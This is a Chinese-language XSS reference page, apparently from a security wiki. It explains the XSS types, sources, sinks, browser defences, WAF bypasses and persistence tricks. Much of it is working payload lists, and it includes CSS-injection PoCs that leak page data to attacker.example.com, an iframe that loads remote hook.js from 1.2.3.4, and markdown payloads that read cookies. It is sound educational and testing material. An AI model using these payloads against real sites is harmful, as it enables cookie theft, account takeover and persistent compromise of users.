
# XSS漏洞

## 简介

XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。

## 反射型XSS

反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：``<?php echo "<p>hello, $_GET['user']</p>";?>`` ，那么在访问时设置 ``/?user=</p><script>alert("hack")</script><p>`` ，则可执行预设好的JavaScript代码。

反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。

## 储存型XSS

储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。

## DOM XSS

DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。

例如

    <html>
    <head>
    <title>DOM Based XSS Demo</title>
    <script>
    function xsstest()
    {
        var str = document.getElementById("input").value;
        document.getElementById("output").innerHTML = "<img src='"+str+"'></img>";
    }
    </script>
    </head>
    <body>
    <div id="output"></div>
    <input type="text" id="input" size=50 value="" />
    <input type="button" value="submit" onclick="xsstest()" />
    </body>
    </html>

输入 ``x' onerror='javascript:alert(/xss/)`` 即可触发。

## Blind XSS

Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。

## 危害

存在XSS漏洞时，可能会导致以下几种情况：

1. 用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。

2. 攻击者能够在一定限度内记录用户的键盘输入。

3. 攻击者通过CSRF等方式以用户身份执行危险操作。

4. XSS蠕虫。

5. 获取用户浏览器信息。

6. 利用XSS漏洞扫描用户内网。

## XSS数据源

### URL

- ``location``
- ``location.href``
- ``location.pathname``
- ``location.search``
- ``location.hash``
- ``document.URL``
- ``document.documentURI``
- ``document.baseURI``

### Navigation

- ``window.name``
- ``document.referrer``

### Communication

- ``Ajax``
- ``Fetch``
- ``WebSocket``
- ``PostMessage``

### Storage

- ``Cookie``
- ``LocalStorage``
- ``SessionStorage``

## Sink

### 执行JavaScript

- ``eval(payload)``
- ``setTimeout(payload, 100)``
- ``setInterval(payload, 100)``
- ``Function(payload)()``
- ``<script>payload</script>``
- ``<img src=x onerror=payload>``

### 加载URL

- ``location=javascript:alert(/xss/)``
- ``location.href=javascript:alert(/xss/)``
- ``location.assign(javascript:alert(/xss/))``
- ``location.replace(javascript:alert(/xss/))``

### 执行HTML

- ``xx.innerHTML=payload``
- ``xx.outerHTML=payload``
- ``document.write(payload)``
- ``document.writeln(payload)``


## 浏览器XSS保护

### HTML过滤

使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。

### X-Frame

X-Frame-Options 响应头有三个可选的值：

- DENY
    - 页面不能被嵌入到任何iframe或frame中
- SAMEORIGIN
    - 页面只能被本站页面嵌入到iframe或者frame中
- ALLOW-FROM
    - 页面允许frame或frame加载

### XSS保护头

基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。

而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。

要设置浏览器的防护机制，则可使用X-XSS-Protection字段
该字段有三个可选的值

- ``0`` : 表示关闭浏览器的XSS防护机制
- ``1`` : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置
- ``1; mode=block`` : 如果检测到恶意代码，在不渲染恶意代码

FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。


## WAF Bypass

- 利用<>标记
- 利用html属性
    - href
    - lowsrc
    - bgsound
    - background
    - value
    - action
    - dynsrc
- 关键字
    - 利用回车拆分
    - 字符串拼接
        - ``window["al" + "ert"]``
- 利用编码绕过
    - base64
    - jsfuck
    - String.fromCharCode
    - HTML
    - URL
    - hex
        - ``window["\x61\x6c\x65\x72\x74"]``
    - unicode
    - utf7
        - ``+ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-``
    - utf16
- 大小写混淆
- 对标签属性值转码
- 产生事件
- css跨站解析
- 长度限制bypass
    - ``eval(name)``
    - ``eval(hash)``
    - ``import``
    - ``$.getScript``
    - ``$.get``
- ``.``
    - 使用 ``。`` 绕过IP/域名
    - ``document['cookie']`` 绕过属性取值
- 过滤引号用 `` ` `` 绕过

## 花式技巧

### httponly

- 在cookie为httponly的情况下，可以通过xss直接在源站完成操作，不直接获取cookie。
- 在有登录操作的情况下，部分站点直接发送登录请求可能会带有cookie
- 部分特定版本的浏览器可能会在httponly支持/处理上存在问题
- 低版本浏览器支持 TRACE / TRACK，可获取敏感的header字段
- phpinfo 等页面可能会回显信息，这些信息中包含http头
- 通过xss劫持页面钓鱼
- 通过xss伪造oauth等授权请求，远程登录


### CSS 注入

CSS注入最早开始于利用CSS中的 ``expression()`` ``url()`` ``regex()`` 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。

#### CSS selectors

    <style>
        #form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
        #form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
        #form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
        [...]
    </style>
    <form action="http://example.com" id="form2">
        <input type="text" id="secret" name="secret" value="abc">
    </form>

上图是利用CSS selectors完成攻击的一个示例

#### Abusing Unicode Range

当可以插入CSS的时候，可以使用 ``font-face`` 配合 ``unicode-range`` 获取目标网页对应字符集。PoC如下


    <style>
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?A); /* fetched */
     unicode-range:U+0041;
    }
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?B); /* fetched too */
     unicode-range:U+0042;
    }
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?C); /* not fetched */
     unicode-range:U+0043;
    }
    #sensitive-information{
     font-family:poc;
    }
    </style>
    <p id="sensitive-information">AB</p>


当字符较多时，则可以结合 ``::first-line``  等CSS属性缩小范围，以获取更精确的内容


#### Bypass Via Script Gadgets

一些网站会使用白名单或者一些基于DOM的防御方式，对这些方式，有一种被称为 ``Code Reuse`` 的攻击方式可以绕过。该方式和二进制攻防中的Gadget相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets`` 中有该方法的具体描述。

portswigger的一篇博文也表达了类似的想法 ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``。

下面有一个简单的例子，这个例子使用了 ``DOMPurify`` 来加固，但是因为引入了 ``jquery.mobile.js`` 导致可以被攻击。

例子:

    // index.php
    <?php

    $msg = $_GET['message'];
    $msg = str_replace("\n", "", $msg);
    $msg = base64_encode($msg);

    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Preview</title>
        <script type="text/javascript" src="purify.js"></script>
        <script type="text/javascript" src="jquery.js"></script>
        <script type="text/javascript" src="jquery.mobile.js"></script>
    </head>
    <body>
        
        <script type="text/javascript">
        var d= atob('<?php echo $msg; ?>');
        var cleanvar = DOMPurify.sanitize(d);
        document.write(cleanvar);
        </script>

    </body>
    </html>


payload

    <div data-role=popup id='-->
    &lt;script&gt;alert(1)&lt;/script&gt;'>
    </div>

#### RPO(Relative Path Overwrite)

RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。

## Payload

### 常用

- ``<script>alert(/xss/)</script>``
- ``<svg onload=alert(document.domain)>``
- ``<img src=document.domain onerror=alert(document.domain)>``
- ``<M onmouseover=alert(document.domain)>M``
- ``<marquee onscroll=alert(document.domain)>``
- ``<a href=javascript:alert(document.domain)>M</a>``
- ``<body onload=alert(document.domain)>``
- ``<details open ontoggle=alert(document.domain)>``
- ``<embed src=javascript:alert(document.domain)>``

### 大小写绕过

- ``<script>alert(1)</script>``
- ``<sCrIpT>alert(1)</sCrIpT>``
- ``<ScRiPt>alert(1)</ScRiPt>``
- ``<sCrIpT>alert(1)</ScRiPt>``
- ``<ScRiPt>alert(1)</sCrIpT>``
- ``<img src=1 onerror=alert(1)>``
- ``<iMg src=1 oNeRrOr=alert(1)>``
- ``<ImG src=1 OnErRoR=alert(1)>``
- ``<img src=1 onerror="alert(&quot;M&quot;)">``

- ``<marquee onscroll=alert(1)>``
- ``<mArQuEe OnScRoLl=alert(1)>``
- ``<MaRqUeE oNsCrOlL=alert(1)>``

### 各种alert

- ``<script>alert(1)</script>``
- ``<script>confirm(1)</script>``
- ``<script>prompt(1)</script>``
- ``<script>alert('1')</script>``
- ``<script>alert("1")</script>``
- ``<script>alert`1`</script>``
- ``<script>(alert)(1)</script>``
- ``<script>a=alert,a(1)</script>``
- ``<script>[1].find(alert)</script>``
- ``<script>top["al"+"ert"](1)</script>``
- ``<script>top["a"+"l"+"e"+"r"+"t"](1)</script>``
- ``<script>top[/al/.source+/ert/.source](1)</script>``
- ``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``

### 伪协议

- ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/00/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/000/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/M/,alert(%22M%22)>M</a>``


### Chrome XSS auditor bypass

- ``?param=https://&param=@z.exeye.io/import%20rel=import%3E``
- ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
- ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``

### 长度限制

    <script>s+="l"</script>
    \...
    <script>eval(s)</script>

### jquery sourceMappingURL

    ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``

### 图片名

    ``"><img src=x onerror=alert(document.cookie)>.gif``

### 过期的payload

- src=javascript:alert基本不可以用
- css expression特性只在旧版本ie可用

### css

    <div style="background-image:url(javascript:alert(/xss/))">
    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>


### markdown

    [a](javascript:prompt(document.cookie))
    [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
    <&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
    ![a'"`onerror=prompt(document.cookie)](x)
    [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
    ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)


### iframe

    <iframe onload='
        var sc   = document.createElement("scr" + "ipt");
        sc.type  = "text/javascr" + "ipt";
        sc.src   = "http://1.2.3.4/js/hook.js";
        document.body.appendChild(sc);
        '
    />

- ``<iframe src=javascript:alert(1)></iframe>``
- ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
- ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
- ``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``
- ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
- ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``

### form

- ``<form action=javascript:alert(1)><input type=submit>``
- ``<form><button formaction=javascript:alert(1)>M``
- ``<form><input formaction=javascript:alert(1) type=submit value=M>``
- ``<form><input formaction=javascript:alert(1) type=image value=M>``
- ``<form><input formaction=javascript:alert(1) type=image src=1>``

### meta

``<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">``

## ROOTKIT

### 基于存储

有时候网站会将信息存储在Cookie或localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对Cookie或localStorage中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了JSON格式的数据时，部分站点存在 ``eval(data)`` 之类的调用。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。

在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 ``String.fromCharCode`` 来绕过。

### Service Worker

Service Worker可以拦截http请求，起到类似本地代理的作用，故可以使用Service Worker Hook一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。

在Chrome中，可通过 ``chrome://inspect/#service-workers`` 来查看Service Worker的状态，并进行停止。

### AppCache

在可控的网络环境下（公共wifi），可以使用AppCache机制，来强制存储一些Payload，未清除的情况下，用户访问站点时对应的payload会一直存在。


## 参考链接


### wiki

- `AwesomeXSS <https://github.com/UltimateHackers/AwesomeXSS>`_
- `w3c <https://w3c.github.io/webappsec-csp/>`_
- `dom xss wiki <https://github.com/wisec/domxsswiki/wiki>`_
- `content-security-policy.com <https://content-security-policy.com/>`_
- `markdwon xss <https://shubs.io/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/>`_
- `xss cheat sheet <https://brutelogic.com.br/blog/cheat-sheet/>`_
- `html5 security cheatsheet <https://html5sec.org/>`_
- `http security headers <https://www.netsparker.com/whitepaper-http-security-headers/>`_
- `XSSChallengeWiki <https://github.com/cure53/XSSChallengeWiki/wiki>`_

### Challenges

- `XSS Challenge By Google <https://xss-game.appspot.com>`_
- `prompt to win <http://prompt.ml/0>`_

### CSS

- `rpo <http://www.thespanner.co.uk/2014/03/21/rpo/>`_
- `rpo攻击初探 <http://www.zjicmisa.org/index.php/archives/127/>`_
- `Reading Data via CSS <https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html>`_
- `css based attack abusing unicode range <http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html>`_
- `css injection <https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce>`_
- `css timing attack <https://blog.sheddow.xyz/css-timing-attack/>`_

### 同源策略

- `Same origin policy <https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>`_
- `cors security guide <https://www.bedefended.com/papers/cors-security-guide>`_
- `logically bypassing browser security boundaries <https://speakerdeck.com/shhnjk/logically-bypassing-browser-security-boundaries>`_

### bypass

- `666 lines of xss payload <https://gist.github.com/JohannesHoppe/5612274>`_
- `xss auditor bypass <https://github.com/masatokinugawa/filterbypass>`_
- `xss auditor bypass writeup <https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html>`_
- `bypassing csp using polyglot jpegs <https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs>`_
- `bypass xss filters using javascript global variables <https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/>`_

### 持久化

- `变种XSS 持久控制 by tig3r <http://drops.wooyun.org/web/10798>`_
- `Using Appcache and ServiceWorker for Evil <https://sakurity.com/blog/2015/08/13/middlekit.html>`_

### Tricks

- `Service Worker 安全探索 <https://github.com/etherdream/sw-sec>`_
- `前端黑魔法 <https://github.com/EtherDream/web-frontend-magic>`_
